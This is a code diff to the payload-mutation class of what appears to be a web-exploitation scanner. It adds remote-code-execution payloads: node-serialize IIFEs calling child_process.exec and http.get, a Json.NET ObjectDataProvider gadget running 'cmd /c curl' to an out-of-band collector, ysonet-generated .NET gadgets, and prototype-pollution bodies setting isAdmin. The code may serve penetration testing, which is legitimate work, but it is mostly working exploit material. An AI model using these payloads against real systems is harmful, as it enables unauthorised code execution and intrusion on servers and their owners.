@@ -88,9 +88,9 @@ class PayloadMutation:
         if self.probe == "oj_object":
             return self._mutate_oj()
         if self.probe in ("viewstate", "dotnet_deser"):
-            return self._mutate_dotnet_viewstate()
+            return self._mutate_dotnet_viewstate() + self._mutate_dotnet_oob()
         if self.probe == "jsonnet":
-            return self._mutate_dotnet_jsonnet()
+            return self._mutate_dotnet_jsonnet() + self._mutate_dotnet_oob()
         if self.probe in ("rce", "phar_deser", "ssrf", "php_input", "lfi", "code_inject", "traversal", "stream"):
             return self._mutate_wrapper()
         if self.probe == "jackson_manual":
@@ -927,20 +927,54 @@ class PayloadMutation:
         results: Mutations = []
 
         if self.probe == "node_serialize":
+            bare = (self.vector.get("value") or "").lstrip().startswith("_$$ND_FUNC$$_")
+
+            def _nodejs_marker(body: str) -> str:
+                inner = "_$$ND_FUNC$$_function(){" + body + "}()"
+                return inner if bare else '{"rce":"' + inner + '"}'
+
             for cmd in self.NODEJS_TEST_COMMANDS:
-                raw = (
-                    '{"rce":"_$$ND_FUNC$$_function(){'
-                    f"require('child_process').exec('{cmd}');"
-                    '}()"}'
-                )
+                raw = _nodejs_marker(f"require('child_process').exec('{cmd}');")
                 b64 = base64.b64encode(raw.encode()).decode()
                 payload = self._make_payload("node_serialize_rce", "node-serialize IIFE", cmd, b64)
                 payload["payload_raw"] = raw
                 payload["note"] = "Requires target to call node-serialize's unserialize() on this JSON"
                 results.append(payload)
+
+            oob_domain = get_oob_domain()
+            if oob_domain:
+                url = f"http://{oob_domain}/"
+                inner = "_$$ND_FUNC$$_function(){" + f"require('http').get('{url}');" + "}()"
+                raw = inner if bare else '{"oob":"' + inner + '"}'
+                b64 = base64.b64encode(raw.encode()).decode()
+                payload = self._make_payload("node_serialize_oob", "node-serialize IIFE: http.get", url, b64)
+                payload["payload_raw"] = raw
+                payload["note"] = (
+                    f"Blind OOB canary — node-serialize unserialize() runs an HTTP GET to {url} "
+                    "(pure 'http' module, no shell/curl needed); check the collector log for a "
+                    "callback on this vector's token. This is the ONLY confirmation signal for the "
+                    "blind /api/import-async sink (response never reflects the result)."
+                )
+                results.append(payload)
             return results
 
-        raw = '{"__proto__": {"isAdmin": true, "polluted": true}}'
+        # Preserve the original benign fields and only swap the __proto__ payload, so baseline and
+        # mutated requests differ ONLY in the dangerous element. Otherwise a bare {"__proto__":...}
+        # body drops the other keys (e.g. theme/lang), the server reshapes its response for a
+        # differently-shaped input, and the content-diff oracle mistakes that benign reshape for a
+        # strong signal (apples-to-oranges). Falls back to the bare payload if the slot is not a JSON object.
+        import json as _json
+        attack_proto = {"isAdmin": True, "polluted": True}
+        raw = None
+        try:
+            original = _json.loads(self.vector.get("value") or "")
+            if isinstance(original, dict):
+                original["__proto__"] = attack_proto
+                raw = _json.dumps(original)
+        except Exception:
+            raw = None
+        if raw is None:
+            raw = _json.dumps({"__proto__": attack_proto})
         b64 = base64.b64encode(raw.encode()).decode()
         payload = self._make_payload("prototype_pollution", "__proto__ injection", None, b64)
         payload["payload_raw"] = raw
@@ -1010,10 +1044,18 @@ class PayloadMutation:
 
     DOTNET_TEST_COMMANDS = TEST_COMMANDS
 
+    # Gadget names + formatter support verified against ysonet v2026.9.2
+    # (`ysonet.exe --category=formatter=Json.NET` / `--list gadgets`). The loop below pairs ONE
+    # resolved formatter with every gadget and silently skips combos ysonet rejects, so the list
+    # must cover both the BinaryFormatter path (viewstate/dotnet_deser probes) and the Json.Net
+    # path (jsonnet / "$type" sink). Columns = verified-supported formatters in v2026.9.2.
     DOTNET_GADGETS = [
-        "TypeConfuseDelegate",
-        "ObjectDataProvider",
-        "ActivitySurrogateSelector",
+        "TypeConfuseDelegate",            # BinaryFormatter / LosFormatter / SoapFormatter (NOT Json.Net)
+        "ActivitySurrogateSelector",      # BinaryFormatter family (NOT Json.Net)
+        "PSObject",                       # BinaryFormatter / LosFormatter / NetDataContract / Soap (NOT Json.Net)
+        "ObjectDataProvider",             # Json.Net / Xaml / many (NOT BinaryFormatter); classic WPF -> .NET Framework
+        "WindowsIdentity",                # BOTH BinaryFormatter and Json.Net; Windows targets
+        "TextFormattingRunProperties",    # BOTH BinaryFormatter and Json.Net; ships Microsoft.PowerShell.Editor.dll
     ]
 
     DOTNET_FORMATTER_MAP = {
@@ -1021,9 +1063,15 @@ class PayloadMutation:
         "objectstateformatter": "ObjectStateFormatter",
         "losformatter": "LosFormatter",
         "netdatacontractserializer": "NetDataContractSerializer",
+        # Json.NET (Newtonsoft TypeNameHandling, the "$type" sink) — ysonet generates it via -f Json.Net,
+        # which also reaches .NET Core targets (unlike the hand-built WPF ObjectDataProvider gadget).
+        "json.net": "Json.Net",
+        "typenamehandling": "Json.Net",
     }
 
     def _resolve_dotnet_formatter(self) -> str:
+        if self.probe == "jsonnet":
+            return "Json.Net"  # $type sink -> ysonet -f Json.Net
         for kw, formatter in self.DOTNET_FORMATTER_MAP.items():
             if kw in self.etype.lower():
                 return formatter
@@ -1099,6 +1147,53 @@ class PayloadMutation:
                 "targets — no GAC, WPF assemblies are not bundled unless explicitly referenced."
             )
             results.append(payload)
+        return results
+
+    def _mutate_dotnet_oob(self) -> Mutations:
+        """Blind-confirmation variant for .NET deserialization: emit gadget payloads whose command
+        makes the target fetch the OOB collector over HTTP (token carried in the URL path), so a
+        blind sink whose result never appears in the response can still be confirmed by a callback.
+        No-op unless an OOB domain is configured. Mirrors the Java/Node OOB canaries — without this,
+        .NET only ran local commands (id/whoami) whose output goes nowhere the tool can observe, so
+        OOB could never confirm. Two sources: a hand-built Json.NET $type ObjectDataProvider gadget
+        (classic .NET Framework only — WPF in the GAC) and, when ysonet.exe is vendored, ysonet-built
+        gadgets (which can target .NET Core). Live strong-confirmation needs a reachable collector and
+        a gadget compatible with the target runtime."""
+        oob_domain = get_oob_domain()
+        if not oob_domain:
+            return []
+        url = f"http://{oob_domain}/"
+        results: Mutations = []
+
+        raw = (
+            '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, '
+            'Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",'
+            '"MethodName":"Start",'
+            '"MethodParameters":{"$type":"System.Collections.ObjectModel.ObservableCollection`1'
+            '[[System.String, mscorlib]], System.ObjectModel",'
+            f'"$values":["cmd","/c curl {url}"]}},'
+            '"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}'
+        )
+        b64 = base64.b64encode(raw.encode()).decode()
+        payload = self._make_payload("dotnet_jsonnet_oob", "ObjectDataProvider: http callback", url, b64)
+        payload["payload_raw"] = raw
+        payload["note"] = (
+            f"Blind OOB canary — if TypeNameHandling.All deserializes this, the target fetches {url}; "
+            "check the collector log for this vector's token. Needs classic .NET Framework (WPF GAC)."
+        )
+        results.append(payload)
+
+        if os.path.exists(self.YSONET_PATH):
+            formatter = self._resolve_dotnet_formatter()
+            for gadget in self.DOTNET_GADGETS:
+                b64 = self._run_ysonet(formatter, gadget, f"curl {url}")
+                if b64:
+                    payload = self._make_payload("dotnet_ysonet_oob", f"{formatter}/{gadget}: http callback", f"curl {url}", b64)
+                    payload["note"] = (
+                        f"Blind OOB canary via ysonet — check {oob_domain}'s collector log for an inbound "
+                        "callback on this vector's token to confirm the gadget executed on the target."
+                    )
+                    results.append(payload)
         return results
 
 
